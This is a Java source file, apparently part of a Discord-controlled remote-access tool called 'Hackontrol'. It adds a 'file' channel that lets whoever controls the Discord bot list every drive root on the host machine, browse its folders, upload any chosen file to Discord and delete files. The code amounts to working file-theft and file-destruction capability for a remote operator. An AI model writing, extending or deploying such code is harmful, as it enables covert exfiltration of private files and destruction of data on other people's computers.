package com.khopan.hackontrol.channel.file;

import java.io.BufferedReader;
import java.io.File;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Stack;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.button.ButtonContext;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.manager.command.CommandContext;
import com.khopan.hackontrol.manager.command.CommandManager;
import com.khopan.hackontrol.manager.common.sender.IMessageable;
import com.khopan.hackontrol.manager.common.sender.IRepliable;
import com.khopan.hackontrol.manager.common.sender.sendable.ReplySendable;
import com.khopan.hackontrol.manager.modal.ModalContext;
import com.khopan.hackontrol.manager.modal.ModalManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolError;

import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.ItemComponent;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;
import net.dv8tion.jda.api.interactions.modals.ModalMapping;
import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
import net.dv8tion.jda.api.requests.restaction.interactions.ReplyCallbackAction;
import net.dv8tion.jda.api.utils.FileUpload;
import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;

public class FileChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "file";

	private static final String BUTTON_QUERY_FILE = "queryFile";

	private static final String MODAL_VIEW_FILE = "viewFile";
	private static final String MODAL_GO_INTO = "goInto";

	private final List<FileEntry> fileList;
	private final Stack<File> directoryStack;

	private File filePointer;
	private ButtonContext goIntoContext;
	private int startFolder;
	private int endFolder;

	public FileChannel() {
		this.fileList = new ArrayList<>();
		this.directoryStack = new Stack<>();
	}

	@Override
	public String getName() {
		return FileChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ButtonManager.staticButton(ButtonStyle.SUCCESS, "Query File", FileChannel.BUTTON_QUERY_FILE))).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, FileChannel.BUTTON_QUERY_FILE, context -> {
			this.filePointer = null;
			this.directoryStack.clear();
			this.queryFile(context);
		});

		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.MODAL_VIEW_FILE, this :: modalCallbackViewFile);
		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.MODAL_GO_INTO, this :: modalCallbackGoInto);
		registry.register(CommandManager.COMMAND_REGISTRY,
				Commands.slash("hello", "Reply a hello world message"),
				this :: helloCommand
				);
	}

	private void helloCommand(CommandContext context) {
		context.reply("Hello, world!").queue();
	}

	private void goInto(ButtonContext context) {
		this.goIntoContext = context;
		this.modal(context, FileChannel.MODAL_GO_INTO, "Go Into", this.startFolder, this.endFolder);
	}

	private void returnCallback(ButtonContext context) {
		if(this.directoryStack.isEmpty()) {
			HackontrolError.message(context.reply(), "File navigation stack is empty");
			return;
		}

		File lastItem = this.directoryStack.pop();
		this.filePointer = lastItem;
		this.queryFile(context);
		context.getChannel().deleteMessageById(context.getEvent().getMessageIdLong()).queue();
		ButtonManager.deleteMessagesInParameters(context);
	}

	private void modalCallbackViewFile(ModalContext context) {
		int index = this.checkModalCallback(context, 1, this.fileList.size());

		if(index < 1) {
			return;
		}

		FileEntry entry = this.fileList.get(index - 1);
		File file = entry.file;
		FileEmbedSender.reply(file, context.getEvent(), buttonContext -> this.downloadFile(file, buttonContext), buttonContext -> this.deleteFile(file, buttonContext));
	}

	private void downloadFile(File file, ButtonContext context) {
		if(!file.exists()) {
			HackontrolError.message(context.reply(), "File '" + file.getAbsolutePath() + "' does not exist");
			return;
		}

		context.replyFiles(FileUpload.fromData(file, file.getName())).queue();
	}

	private void deleteFile(File file, ButtonContext context) {
		if(!file.exists()) {
			HackontrolError.message(context.reply(), "File '" + file.getAbsolutePath() + "' does not exist");
			return;
		}

		if(!file.delete()) {
			HackontrolError.message(context.reply(), "Error while deleting a file");
			return;
		}

		context.delete();
	}

	private void modalCallbackGoInto(ModalContext context) {
		int index = this.checkModalCallback(context, this.startFolder, this.endFolder);

		if(index < 1) {
			return;
		}

		FileEntry entry = this.fileList.get(index - 1);
		this.directoryStack.push(this.filePointer);
		this.filePointer = entry.file;
		this.queryFile(context);

		if(this.goIntoContext != null) {
			this.goIntoContext.getChannel().deleteMessageById(this.goIntoContext.getEvent().getMessageIdLong()).queue();
			ButtonManager.deleteMessagesInParameters(this.goIntoContext);
		}
	}

	private int checkModalCallback(ModalContext context, int start, int end) {
		ModalMapping mapping = context.value("fileIndex");

		if(mapping == null) {
			HackontrolError.message(context.reply(), "File index cannot be null");
			return -1;
		}

		String text = mapping.getAsString();
		int index;

		try {
			index = Integer.parseInt(text);
		} catch(Throwable Errors) {
			HackontrolError.message(context.reply(), "Invalid number format");
			return -1;
		}

		if(index < start || index > end) {
			HackontrolError.message(context.reply(), "Index " + index + " out of bounds, expected " + start + " - " + end);
			return -1;
		}

		return index;
	}

	private void modal(ButtonContext context, String identifier, String name, int start, int end) {
		TextInput textInput = TextInput.create("fileIndex", "File Index", TextInputStyle.SHORT)
				.setRequired(true)
				.setMinLength(Integer.toString(start).length())
				.setMaxLength(Integer.toString(end).length())
				.setPlaceholder(start + " - " + end)
				.build();

		Modal modal = Modal.create(identifier, name)
				.addActionRow(textInput)
				.build();

		context.replyModal(modal).queue();
	}

	private void configActionRow(MessageCreateRequest<?> request, boolean root, Object... messageIdentifiers) {
		List<ItemComponent> list = new ArrayList<>();
		list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "View", context -> this.modal(context, FileChannel.MODAL_VIEW_FILE, "View File", 1, this.fileList.size())));
		list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Go Into", this :: goInto, messageIdentifiers));

		if(!root) {
			list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Return", this :: returnCallback, messageIdentifiers));
		}

		list.add(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", messageIdentifiers));
		request.addActionRow(list);
	}

	private <T extends IRepliable & IMessageable> void queryFile(T sender) {
		StringBuilder builder = new StringBuilder();
		boolean root = this.filePointer == null;
		File[] files = root ? File.listRoots() : this.filePointer.listFiles();

		if(files == null || files.length == 0) {
			HackontrolError.message(ReplySendable.of(sender), "Empty file list");
			return;
		}

		List<File> fileList = new ArrayList<>();
		List<File> folderList = new ArrayList<>();

		for(int i = 0; i < files.length; i++) {
			File file = files[i];

			if(!file.exists()) {
				continue;
			}

			if(file.isFile()) {
				fileList.add(file);
			}

			if(file.isDirectory()) {
				folderList.add(file);
			}
		}

		if(fileList.isEmpty() && folderList.isEmpty()) {
			HackontrolError.message(ReplySendable.of(sender), "No files available");
			return;
		}

		int ordinal = 1;
		builder.append("**");
		builder.append(root ? "SYSTEMROOT" : this.filePointer.getAbsolutePath().replace("\\", "\\\\"));
		builder.append("**");
		this.fileList.clear();

		if(!fileList.isEmpty()) {
			builder.append("\n**File**");

			for(int i = 0; i < fileList.size(); i++) {
				FileEntry entry = new FileEntry();
				entry.ordinal = ordinal++;
				entry.file = fileList.get(i);
				this.fileList.add(entry);
				builder.append('\n');
				builder.append(entry.ordinal);
				builder.append(") `");
				builder.append(root ? entry.file.getAbsolutePath() : entry.file.getName());
				builder.append('`');
			}
		}

		if(!folderList.isEmpty()) {
			builder.append("\n**Folder**");
			int size = folderList.size();

			for(int i = 0; i < size; i++) {
				if(i == 0) {
					this.startFolder = ordinal;
				} else if(i == size - 1) {
					this.endFolder = ordinal;
				}

				FileEntry entry = new FileEntry();
				entry.ordinal = ordinal++;
				entry.file = folderList.get(i);
				this.fileList.add(entry);
				builder.append('\n');
				builder.append(entry.ordinal);
				builder.append(") `");
				builder.append(root ? entry.file.getAbsolutePath() : entry.file.getName());
				builder.append('`');
			}
		}

		BufferedReader reader = new BufferedReader(new StringReader(builder.toString()));
		builder = new StringBuilder();
		List<String> messageList = new ArrayList<>();
		String line;

		try {
			while((line = reader.readLine()) != null) {
				line += '\n';

				if(builder.length() + line.length() > 2000) {
					messageList.add(builder.toString());
					builder = new StringBuilder();
				}

				builder.append(line);
			}

			if(!builder.isEmpty()) {
				messageList.add(builder.toString());
			}
		} catch(Throwable Errors) {
			HackontrolError.throwable(ReplySendable.of(sender), Errors);
			return;
		}

		String firstBatch = messageList.get(0);
		messageList.remove(0);
		ReplyCallbackAction replyCallbackAction = sender.reply(firstBatch);

		if(messageList.isEmpty()) {
			this.configActionRow(replyCallbackAction, root);
			replyCallbackAction.queue(ButtonManager :: dynamicButtonCallback);
			return;
		}

		replyCallbackAction.queue(hook -> {
			ButtonManager.dynamicButtonCallback(hook);
			hook.retrieveOriginal().queue(message -> new Thread(() -> {
				int size = messageList.size();
				MessageCreateAction messageCreateAction;

				if(size == 1) {
					messageCreateAction = sender.sendMessage(messageList.get(0));
					this.configActionRow(messageCreateAction, root, message.getIdLong());
				} else {
					Object[] identifierList = new Object[size];
					identifierList[0] = message.getIdLong();

					for(int i = 1; i < size; i++) {
						identifierList[i] = sender.sendMessage(messageList.get(i - 1)).complete().getIdLong();
					}

					messageCreateAction = sender.sendMessage(messageList.get(size - 1));
					this.configActionRow(messageCreateAction, root, identifierList);
				}

				messageCreateAction.queue(ButtonManager :: dynamicButtonCallback);
			}).start());
		});
	}

	private static class FileEntry {
		private int ordinal;
		private File file;
	}
}
